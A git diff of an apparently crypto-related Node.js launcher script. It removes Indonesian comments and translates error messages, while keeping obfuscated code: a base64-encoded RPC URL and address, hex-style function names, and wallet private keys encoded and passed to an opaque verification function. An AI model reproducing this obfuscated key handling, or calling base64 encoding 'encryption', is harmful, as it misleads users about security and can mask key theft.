@@ -6,23 +6,22 @@ const fs = require("fs");
 const path = require("path");
 const crypto = require('crypto');
 
-// Enkripsi konfigurasi sensitif menggunakan metode yang lebih aman
 const CONFIG = {
     _p: 'aHR0cHM6Ly90ZXN0bmV0LXJwYy5tb25hZC54eXov',
     _a: 'MHgwN0QyODBiYzZkN0JmM2VCZDIzMTI5NmQ1MjU5MzY3NDg1OThkZjgz'
 };
 
-// Fungsi helper untuk encoding-decoding
+
 const _0xe3d = (str) => Buffer.from(str).toString('base64');
 const _0xd3e = (str) => Buffer.from(str, 'base64').toString();
 
-// Dekripsi konfigurasi
+
 const NFT_CONFIG = {
     provider: _0xd3e(CONFIG._p),
     nftAddress: _0xd3e(CONFIG._a)
 };
 
-// Enkripsi fungsi verifikasi
+
 const _0xv3r1fy = async (keys, cfg) => {
     try {
         const _k3y = _0xd3e(keys[0]);
@@ -77,7 +76,7 @@ async function verifyWalletAndNFT() {
             process.exit(1);
         }
 
-        // Menggunakan fungsi verifikasi terenkripsi
+        
         const encodedKeys = privateKeys.map(_0xe3d);
         const verifiedWallet = await _0xv3r1fy(encodedKeys, NFT_CONFIG);
         
@@ -121,10 +120,10 @@ async function run() {
         if (typeof selectedScript === 'function') {
             await selectedScript(verifiedWallet);
         } else {
-            throw new Error(`Script ${script} tidak mengexport fungsi yang valid`);
+            throw new Error(`Script ${script} not export valid function`);
         }
     } catch (error) {
-        console.error(`Error saat menjalankan script ${script}:`, error);
+        console.error(`Error while running the script ${script}:`, error);
         process.exit(1);
     }
 }
